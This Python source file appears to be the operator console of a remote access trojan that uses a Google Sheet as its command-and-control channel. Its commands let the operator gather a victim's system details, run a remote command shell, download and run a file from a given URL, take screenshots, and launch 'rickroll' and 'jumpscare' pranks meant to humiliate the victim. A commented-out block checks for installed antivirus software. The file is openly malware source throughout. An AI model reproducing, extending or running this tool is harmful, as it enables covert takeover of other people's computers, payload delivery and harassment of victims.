print('[ * ] Loading Imports')

import gspread
from oauth2client.service_account import ServiceAccountCredentials
import time
import os
from termcolor import colored

print('[ * ] Loaded Imports')
print('[ * ] Loading Modules')

scope = ['https://spreadsheets.google.com/feeds',
         'https://www.googleapis.com/auth/drive']
creds = ServiceAccountCredentials.from_json_keyfile_name('client_secrets.json', scope)
client = gspread.authorize(creds)
sheet = client.open('Control Panel').sheet1

client_status = 'Disconected'

client_name = sheet.cell(8, 5).value
client_mac = sheet.cell(9, 5).value
client_ip = sheet.cell(10, 5).value

# Other
shell_delay = "1"

#Shell
shell = '0'
shell_prompt='$: '
shell_command = ''

prompt = '> '

print('[ * ] Modules loaded')
print('')
print('[ * ] Awaiting connection')
sheet.update_cell(7, 8, 'Client Disconnected')
option = sheet.cell(7, 8).value
while option == 'Client Disconnected':
    option = sheet.cell(7, 8).value
    time.sleep(1)
print('[ * ] Received connection')
print('')

while True:

    shell_output = sheet.cell(4, 7).value
    client_status_check = sheet.cell(7, 8).value
    command = raw_input(prompt)


    # Conection Status
    if command == "connect":
        sheet.update_cell(7, 8, 'Client Disconnected')
        time.sleep(4.5)
        option = sheet.cell(7, 8).value
     #   while option == 'Client Disconnected':
     #       option = sheet.cell(7, 8).value
        time.sleep(4)
        print(option)


    # Get info
    if command == "sysinfo":
        sheet.update_cell(4, 5, '8')
        detail_status = sheet.cell(4, 5).value
        #while detail_status == '8':
        #    time.sleep(1)
        time.sleep(4.5)
    #    prompt = '(' + client_name + ') > '
        client_name = sheet.cell(8, 5).value
        client_mac = sheet.cell(9, 5).value
        client_ip = sheet.cell(10, 5).value
        print('Name: ' + client_name)
        print('Mac: ' + client_mac)
        print('IP: ' + client_ip)


    # Shell
    if command == "shell":
        shell = '1'
        print('Loaded shell')
        while shell == '1':
            shell_command = raw_input(shell_prompt)
            if shell_command == 'exit':
                shell = '0'
                print('Exited shell')
            elif shell_command == '':
                print('Invalid command!')
            else:
                sheet.update_cell(4, 7, 'waiting...')
                sheet.update_cell(6, 5, shell_command)
                time.sleep(1)
                sheet.update_cell(4, 5, '12')
                shell_output = sheet.cell(4, 7).value
                while shell_output == 'waiting...':
                    shell_output = sheet.cell(4, 7).value
                    time.sleep(1)
                print(shell_output)


    # Set Delay
    if command == "set shell delay":
        shell_delay = raw_input("Input new shell delay: ")
        shell_delay = int(shell_delay)
        print("Changed shell delay")


    # Show Delay
    if command == "show shell delay":
        print(shell_delay)


    # Inject
    if command == "inject":
        inject_url = raw_input("Enter inject file url: ")
        sheet.update_cell(6, 5, inject_url)
        time.sleep(0.25)
        sheet.update_cell(4, 5, '5')


    # Screen shot
    if command == "screenshot":
        sheet.update_cell(4, 7, 'waiting...')
        sheet.update_cell(4, 5, '1')
        shell_output = sheet.cell(4, 7).value
        while shell_output == 'waiting...':
            shell_output = sheet.cell(4, 7).value
            time.sleep(1)
        screenshotlink = 'start ' + shell_output
        os.popen(screenshotlink)


    # avcheck
    if command == "avcheck":
        print("Feature not added")
    """    sheet.update_cell(4, 7, 'waiting...')
        sheet.update_cell(6, 5, 'dir "C:\Program Files (x86)"')
        time.sleep(1)
        sheet.update_cell(4, 5, '12')
        potentAV = sheet.cell(4, 7).value
        while potentAV == 'waiting...':
            potentAV = sheet.cell(4, 7).value
            time.sleep(1)
        print('')
        print("Possiable Antivirus:")
        AVlist = potentAV.replace('\r', ' \t')
        print(AVlist)
        avast = "AVAST" in AVlist
        if avast == "True":
            print("Avast: TRUE")
        else:
            print("Avast: FALSE")
        windows_defender = "Windows Defender" in AVlist
        if windows_defender == "True":
            print("Windows Defender: TRUE")
        else:
            print("Windows Defender: FLASE")
        print("") """


    # Help
    if command == "help":
        print('')
        print('Commands:')
     #   print('status: Tests to see whether or not the host is connected')
        print("sysinfo: Get's client details")
        print("shell: Drops into a cmd shell(Not persistent)")
        print("inject: Downloads and automatically runs a file")
        print("screenshot: Takes a screenshot of the clients computer")
        print("avcheck: Scans installed programs for known antiviruses")
        print("set shell delay: Allows you to change the check delay")
        print("show shell delay: Shows current shell delay")
        print("rickroll: Humiliates client by rick rolling them")
        print("jumpscare: Does what it says")
        print('')

    # Close Connection
    if command == "terminate":
        sheet.update_cell(4, 5, '9')
        print('Terminated session')
        time.sleep(2)
        break


    # Rickroll
    if command == "rickroll":
        sheet.update_cell(4, 5, '11')
        print('Client has been humiliated')


    # Jumpscare
    if command == "jumpscare":
        sheet.update_cell(4, 5, '10')
        print('Jumpscare launched')


    if command == "exit":
        break


    else:
     #   time.sleep(0.25)
    #    print('')
    #    print('Unrecognised command, Type help to check commands')
      #  print('')
        continue